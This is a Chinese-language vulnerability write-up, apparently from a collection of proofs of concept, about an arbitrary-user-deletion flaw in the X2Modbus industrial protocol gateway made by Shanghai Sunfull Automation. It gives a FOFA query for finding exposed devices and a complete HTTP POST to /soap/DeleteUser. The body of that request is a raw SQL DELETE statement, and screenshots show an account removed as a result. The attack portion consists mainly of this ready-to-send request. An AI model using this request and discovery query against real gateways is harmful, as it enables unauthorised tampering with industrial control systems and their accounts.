# 上海迅饶自动化科技有限公司X2Modbus网关任意用户删除漏洞

# 一、漏洞简介
X2Modbus是上海迅饶自动化科技有限公司开发的一款功能很强大的协议转换网关， 这里的X代表各家不同的通信协议， 2是To的谐音表示转换， Modbus就是最终支持的标准协议是Modbus协议。用户可以根据现场设备的通信协议进行配置，转成标准的Modbus协议。在PC端仿真运行无误后，上传到硬件协议转换网关。上海迅饶自动化科技有限公司X2Modbus网关任意用户删除漏洞

# 二、影响版本
+ X2Modbus

# 三、资产测绘
+ fofa`server="SunFull-Webs" || icon_hash="-1384370370"`
+ 特征

![1710416347834-b54d34ac-c701-4de7-aa01-4e4e7792c936.png](./img/wPHoPD3sv_JhVtmu/1710416347834-b54d34ac-c701-4de7-aa01-4e4e7792c936-219366.png)

# 四、漏洞复现
删除前账号

![1712507909745-a45f3985-9d5c-40e6-939d-c770d21daee8.png](./img/wPHoPD3sv_JhVtmu/1712507909745-a45f3985-9d5c-40e6-939d-c770d21daee8-356690.png)

```java
POST /soap/DeleteUser HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 39
Connection: close
Cookie: language=zh-cn; language=zh-cn

delete from userid where username='stc'
```

![1712507935042-e1380807-910e-4d76-b5c7-4e2f0af05c76.png](./img/wPHoPD3sv_JhVtmu/1712507935042-e1380807-910e-4d76-b5c7-4e2f0af05c76-899725.png)

删除后

![1712507955869-61cca64e-db36-4d80-aaed-2f02c6bfd456.png](./img/wPHoPD3sv_JhVtmu/1712507955869-61cca64e-db36-4d80-aaed-2f02c6bfd456-979986.png)



> 更新: 2024-04-16 16:50:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gqtttrccg5d19xuw>